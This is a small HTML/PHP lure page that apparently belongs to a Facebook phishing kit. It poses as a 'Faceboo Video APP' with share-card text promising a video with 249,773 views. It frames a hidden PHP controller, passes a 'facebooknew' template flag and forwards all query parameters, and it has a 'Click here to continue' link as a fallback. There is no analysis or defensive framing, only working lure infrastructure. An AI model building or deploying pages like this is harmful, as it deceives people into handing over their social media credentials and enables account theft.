
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="249,773 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLER95784733-bc1b-4a6d-a523-0571d75e97f5.php?source=.%2Fpublic%2FACCESSS42da7921-a7f5-4593-a02d-291cfc461b41&lan=facebooknew&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLER95784733-bc1b-4a6d-a523-0571d75e97f5.php?source=.%2Fpublic%2FACCESSS42da7921-a7f5-4593-a02d-291cfc461b41&lan=facebooknew&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   